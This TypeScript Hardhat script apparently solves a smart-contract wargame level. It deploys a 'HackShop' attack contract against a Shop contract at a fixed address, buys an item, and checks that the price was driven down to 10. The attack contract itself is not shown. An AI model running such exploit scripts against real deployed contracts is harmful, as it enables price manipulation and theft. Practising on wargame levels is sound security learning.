import { expect } from "chai";
import { ethers } from "hardhat";
import { HackShop, HackShop__factory, Shop, Shop__factory } from "../typechain";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0xe1B618557BAa57E8C6FD07885eC673520A48436f';
  const instance: Shop = Shop__factory.connect(deployedAddress, addr1);

  const attackInstance: HackShop = await new HackShop__factory(addr1).deploy(deployedAddress, { gasLimit: 2000000 });
  await attackInstance.deployed();
  console.log("deployed : " + attackInstance.address)

  await (await attackInstance.buy()).wait(1)
  expect(await instance.price()).to.be.eq(10)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
